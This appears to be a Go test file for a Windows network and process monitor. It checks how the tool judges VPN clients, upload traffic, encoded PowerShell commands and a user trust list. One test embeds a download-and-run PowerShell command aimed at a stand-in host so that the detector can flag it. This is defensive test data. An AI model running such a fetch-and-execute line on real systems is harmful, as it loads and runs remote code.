package main

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf16"
)

// Cases taken from a real machine: a VPN client that re-opens every program's connections,
// and a scheduled task that runs an encoded but harmless PowerShell script.

func encodePS(script string) string {
	u := utf16.Encode([]rune(script))
	b := make([]byte, 0, len(u)*2)
	for _, v := range u {
		b = append(b, byte(v), byte(v>>8))
	}
	return base64.StdEncoding.EncodeToString(b)
}

func TestVPNClientIsRecognisedByItsTunnelDriver(t *testing.T) {
	dir := t.TempDir()
	exe := filepath.Join(dir, "examplevpn.exe")
	_ = os.WriteFile(exe, []byte("x"), 0o600)
	_ = os.WriteFile(filepath.Join(dir, "wintun.dll"), []byte("x"), 0o600)
	vpn := meta("examplevpn.exe", exe, "unsigned", "")
	if k := actorKind(vpn); k != "tunnel" {
		t.Fatalf("VPN client not recognised, got %q", k)
	}
	// all of the user's traffic leaves through it: 50 MB out to one address must not be an alarm
	v := judge(vpn, serviceFor("x.hls.ttvnw.net", ""), 1<<20, 50<<20, true, nil)
	if v.Level != "ok" || !strings.Contains(v.Label, "VPN") {
		t.Fatalf("VPN transfer should be expected: %+v", v)
	}
	// an unsigned program next to no tunnel driver stays suspicious
	plain := filepath.Join(t.TempDir(), "mystery.exe")
	_ = os.WriteFile(plain, []byte("x"), 0o600)
	if v := judge(meta("mystery.exe", plain, "unsigned", ""), nil, 0, 50<<20, false, nil); v.Level == "ok" {
		t.Fatalf("ordinary unsigned uploader must not be waved through: %+v", v)
	}
	// ...and a tunnel-looking name cannot hide a program that is itself dangerous
	evil := meta("clash.exe", `C:\Users\u\AppData\Local\Temp\clash.exe`, "tampered", "")
	scoreProc(evil)
	if actorKind(evil) == "tunnel" {
		t.Fatalf("a high-risk program must not be treated as a VPN client (score %d)", evil.Score)
	}
}

func TestTwoWayTrafficIsNotAnUpload(t *testing.T) {
	app := meta("game.exe", `C:\Games\game.exe`, "unsigned", "")
	if v := judge(app, nil, 50<<20, 50<<20, true, nil); v.Level != "ok" {
		t.Fatalf("balanced traffic (stream, call, game) must be ok: %+v", v)
	}
	if v := judge(app, nil, 100<<10, 50<<20, true, nil); v.Level == "ok" {
		t.Fatalf("one-sided 50MB upload must still be flagged: %+v", v)
	}
}

func TestEncodedPowerShellIsJudgedByItsContent(t *testing.T) {
	benign := encodePS("Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('reminder')")
	m := &ProcMeta{Name: "powershell.exe", Cmd: "powershell.exe -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand " + benign}
	scoreProc(m)
	if m.Level != "ok" || m.Score != 0 {
		t.Fatalf("harmless encoded script must not be flagged: score=%d %v", m.Score, m.Reasons)
	}
	if s, ok := decodePSCommand(m.Cmd); !ok || !strings.Contains(s, "MessageBox") {
		t.Fatalf("script not decoded: %q %v", s, ok)
	}

	evil := encodePS("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/p.ps1')")
	m = &ProcMeta{Name: "powershell.exe", Cmd: "powershell.exe -enc " + evil}
	scoreProc(m)
	if m.Level != "bad" || !strings.Contains(strings.Join(m.Reasons, " "), "DownloadString") {
		t.Fatalf("download-and-run script must be bad: score=%d %v", m.Score, m.Reasons)
	}

	m = &ProcMeta{Name: "powershell.exe", Cmd: "powershell.exe -enc AAAA"}
	scoreProc(m)
	if m.Level == "bad" {
		t.Fatalf("garbage after -enc must not be treated as malicious on its own")
	}
}

func TestUserTrust(t *testing.T) {
	t.Setenv("APPDATA", t.TempDir()) // trust list is saved to disk
	utMu.Lock()
	utList = map[string]trustEntry{}
	utMu.Unlock()

	exe := filepath.Join(t.TempDir(), "mytool.exe")
	_ = os.WriteFile(exe, []byte("first version"), 0o600)
	prog := meta("mytool.exe", exe, "unsigned", "")
	if v := judge(prog, nil, 0, 50<<20, false, nil); v.Level == "ok" {
		t.Fatalf("setup: untrusted uploader should be flagged: %+v", v)
	}

	// an incident already exists for it
	in := Incident{Key: "upload|mytool", Kind: "upload", Severity: "warn", Title: "x", Exe: exe}
	addIncident(in, nil)
	if hasIncident("upload", "upload|mytool") == nil {
		t.Fatal("setup: incident missing")
	}

	if err := trustProgram(exe); err != nil {
		t.Fatal(err)
	}
	if !isUserTrusted(exe) {
		t.Fatal("trust not recorded")
	}
	if hasIncident("upload", "upload|mytool") != nil {
		t.Error("trusting a program should remove its earlier incidents")
	}
	if v := judge(prog, nil, 0, 50<<20, false, nil); v.Level != "ok" || !strings.Contains(v.Label, "доверенн") {
		t.Errorf("trusted program should be ok: %+v", v)
	}
	addIncident(Incident{Key: "upload|mytool2", Kind: "upload", Severity: "bad", Title: "again", Exe: exe}, nil)
	if hasIncident("upload", "upload|mytool2") != nil {
		t.Error("new incidents for a trusted program must be dropped")
	}
	m := &ProcMeta{Name: "mytool.exe", Exe: exe, Sig: "unsigned"}
	scoreProc(m)
	if m.Score != 0 {
		t.Errorf("trusted program must score 0, got %d", m.Score)
	}

	// replacing the file revokes the trust
	_ = os.WriteFile(exe, []byte("a different, possibly malicious, build"), 0o600)
	if isUserTrusted(exe) {
		t.Error("trust must be revoked when the file changes")
	}

	_ = trustProgram(exe)
	untrustProgram(exe)
	if isUserTrusted(exe) || len(trustedList()) != 0 {
		t.Error("untrust did not work")
	}
}

func TestTunnelAdapterTraffic(t *testing.T) {
	if !isTunnelIP("198.18.0.1") {
		t.Error("198.18.0.0/15 is the tun2socks block")
	}
	tunnelIPs["10.77.0.2"] = true
	defer delete(tunnelIPs, "10.77.0.2")
	parsePacket(ipv4(6, [4]byte{10, 77, 0, 2}, [4]byte{93, 184, 216, 35}, tcp(50500, 443, 0x10, make([]byte, 50))), "10.77.0.2")
	found := false
	for _, f := range flowsSnapshot() {
		if f.Remote == "93.184.216.35" && f.Tunnel {
			found = true
		}
	}
	if !found {
		t.Error("flow on a tunnel adapter not marked")
	}
}
